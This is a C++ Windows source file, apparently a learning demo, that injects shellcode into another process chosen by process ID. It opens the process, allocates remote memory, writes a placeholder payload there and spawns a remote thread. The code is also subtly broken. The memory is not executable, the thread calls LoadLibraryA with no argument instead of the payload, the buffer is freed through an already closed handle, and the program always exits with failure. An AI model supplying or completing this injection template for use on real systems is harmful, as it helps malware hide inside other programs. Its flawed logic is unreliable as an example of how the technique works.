#include <cstdlib>
#include <windows.h>
// demonstration of shellcode process injection	

#include <WinUser.h>
#include <stdio.h>
#include <stdlib.h>
#include <errhandlingapi.h>


#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define error(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)



int main(int argc, char* argv[])
{
			DWORD PID = NULL;
			HANDLE hProcess = NULL;
			HANDLE hThread = NULL;
			LPVOID pRemoteBuffer = NULL;
//			PVOID rBuffer = NULL;
			

			CONST UCHAR shellcode[] = "\x41\x41\x41\x41";
			SIZE_T shellcodeSize = sizeof(shellcode);


			if (argc < 2)
			{
					printf("Usage: %s <process-id>\n", argv[0]);
					return EXIT_FAILURE;
			}
	
			PID = atoi(argv[1]);
			okay("trying to open process with PID: (%ld)", PID, GetLastError());


			/*------------[GET HANDLE]-----------*/
			hProcess = OpenProcess(
				PROCESS_ALL_ACCESS,
				FALSE,
				PID
			);
			if (hProcess == NULL)
			{
					error("Failed to open process, error: %ld", GetLastError());
					return EXIT_FAILURE;
			}
			else
			{
					okay("Successfully opened process with PID: (%ld)", PID);
			}
			



			/*------------[ALLOCCATE BUFFER]-----------*/
			pRemoteBuffer = VirtualAllocEx(
				hProcess,
				NULL,
				sizeof(shellcode),
				MEM_COMMIT | MEM_RESERVE,
				PAGE_READWRITE
			);
			if (pRemoteBuffer == NULL)
			{
					error("Failed to allocate memory in process, error: %ld", GetLastError());
					return EXIT_FAILURE;
			}
			else
			{
					okay("Successfully allocated memory in process with PID: (%ld)", PID);
			}


			/*------------[WRITE PAYLOAD TO BUFFER]-----------*/
			if (!WriteProcessMemory(
				hProcess,
				pRemoteBuffer,
				shellcode,
				sizeof(shellcode),
				NULL
			))
			{
					error("Failed to write shellcode to process, error: %ld", GetLastError());
					goto CLEANUP;
			}
			else
			{
					okay("Successfully wrote shellcode to process with PID: (%ld)", PID);
			}

			
			/*------------[CREATE THREAD & EXECUTE PAYLOAD]-----------*/
			hThread = CreateRemoteThreadEx(
				hProcess,
				NULL,
				0,
				(LPTHREAD_START_ROUTINE)LoadLibraryA,
				NULL,
				0,
				NULL
			);
			if (hThread == NULL)
			{
					error("Failed to create remote thread, error: %ld", GetLastError());
					return EXIT_FAILURE;
			}
			else
			{
					okay("Successfully created remote thread in process with PID: (%ld)", PID);
			}



		CLEANUP:
			if (hThread != NULL)
			{
					info("Closing thread handle");
					CloseHandle(hThread);
			}

			if (hProcess != NULL)
			{
					info("Closing process handle");
					CloseHandle(hProcess);
			}

			if (pRemoteBuffer != NULL)
			{
					info("Freeing remote buffer");
					VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
			}


	return EXIT_FAILURE;

}